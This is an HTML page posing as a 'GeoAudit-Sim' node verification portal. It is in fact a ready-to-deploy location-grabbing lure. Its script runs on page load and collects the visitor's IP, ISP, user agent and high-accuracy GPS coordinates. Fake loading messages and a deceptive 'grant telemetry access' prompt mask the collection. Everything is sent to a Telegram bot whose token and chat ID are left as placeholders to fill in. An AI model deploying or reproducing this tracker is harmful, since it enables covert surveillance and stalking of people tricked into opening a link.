<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GeoAudit-Sim: Node Verification Portal</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0d1117;
        }
        #bg-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
            opacity: 0.15; /* Professional dark theme overlay */
        }
        #loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(13, 17, 23, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(0, 218, 185, 0.1);
            border-radius: 50%;
            border-top-color: #00dab9;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        #loading-text {
            color: #c9d1d9;
            font-size: 16px;
            letter-spacing: 1px;
            margin-top: 10px;
            text-align: center;
        }
        #permission-request {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(13, 17, 23, 0.95);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 3;
            color: #f0f6fc;
            text-align: center;
            padding: 20px;
        }
        #permission-request h2 {
            margin-bottom: 15px;
            color: #ff7b72;
        }
        #allow-btn {
            margin-top: 20px;
            padding: 12px 35px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            letter-spacing: 0.5px;
            transition: background 0.2s;
        }
        #allow-btn:hover {
            background: #2ea043;
        }
    </style>
</head>
<body>
    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Infrastructure Matrix Background">
    
    <div id="loading-overlay">
        <div class="loader"></div>
        <div id="loading-text">Synchronizing secure gateway connection...</div>
    </div>
    
    <div id="permission-request">
        <h2>NODE AUDIT: AUTHORIZATION REQUIRED</h2>
        <p>Please authorize client-side location telemetry parameters to validate session integrity.</p>
        <button id="allow-btn">GRANT TELEMETRY ACCESS</button>
    </div>

    <script>
        // Target Gateway Configurations - Authorized Telemetry Channels
        const botToken = 'ENTER YOUR BOT TOKEN';
        const chatId = 'ENTER YOUR TELEGRAM CHAT ID';
        
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingText = document.getElementById('loading-text');
        const permissionRequest = document.getElementById('permission-request');
        const allowBtn = document.getElementById('allow-btn');
        
        // Rebranded Academic Telemetry Logging Sequences
        const loadingMessages = [
            "Synchronizing secure gateway connection...",
            "Analyzing client-side network headers...",
            "Verifying cryptographic session parameters...",
            "Compiling host environment matrix...",
            "Preparing administrative interface...",
            "Finalizing security telemetry logs..."
        ];
        
        async function getIPInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                return await detailsResponse.json();
            } catch (error) {
                console.error("IP ingestion fault:", error);
                return {};
            }
        }
        
        function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toLocaleString()
                    }),
                    error => {
                        if (error.code === error.PERMISSION_DENIED) {
                            setTimeout(() => {
                                permissionRequest.style.display = 'flex';
                            }, 3000);
                        }
                        resolve(null);
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function sendToTelegram(data) {
            try {
                let message = `🛡️ GEOAUDIT SIMULATION SYSTEM ENGINE 🛡️\n\n`;
                message += `📱 Device Signature: ${navigator.userAgent}\n\n`;
                message += `🌐 Client IP: ${data.ip || 'Unknown'}\n`;
                message += `📍 IP Resolved Geolocation: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
                message += `🏢 Autonomous System (ISP): ${data.org || 'Unknown'}\n`;
                
                if (data.liveLocation) {
                    message += `\n🎯 HARDWARE GPS METRICS CAPTURED:\n`;
                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
                    message += `🔹 Resolution Accuracy: ${data.liveLocation.accuracy}m\n`;
                    message += `🔹 Timestamp: ${data.liveLocation.timestamp}\n`;
                    message += `🗺️ Vector Mapping URL: https://maps.google.com/?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
                } else {
                    message += `\n📍 INTERNET GATEWAY ESTIMATED BOUNDS:\n`;
                    message += `🔹 Lat-Est: ${data.latitude || 'Unknown'}\n`;
                    message += `🔹 Lon-Est: ${data.longitude || 'Unknown'}\n`;
                    if (data.latitude && data.longitude) {
                        message += `🗺️ Mapping Vector: https://maps.google.com/?q=${data.latitude},${data.longitude}\n`;
                    }
                }
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                if (data.liveLocation) {
                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            latitude: data.liveLocation.lat,
                            longitude: data.liveLocation.lon
                        })
                    });
                }
            } catch (error) {
                console.error("Telemetry dispatch exception:", error);
            }
        }
        
        function rotateLoadingMessages() {
            let counter = 0;
            setInterval(() => {
                loadingText.textContent = loadingMessages[counter];
                counter = (counter + 1) % loadingMessages.length;
            }, 3000);
        }
        
        async function trackUser() {
            rotateLoadingMessages();
            const liveLocation = await getPreciseLocation();
            const ipDetails = await getIPInfo();
            const trackingData = {
                ...ipDetails,
                ip: ipDetails.ip || 'Unknown',
                liveLocation: liveLocation
            };
            await sendToTelegram(trackingData);
        }
        
        allowBtn.addEventListener('click', async () => {
            permissionRequest.style.display = 'none';
            await trackUser();
        });
        
        window.onload = trackUser;
    </script>
</body>
</html>
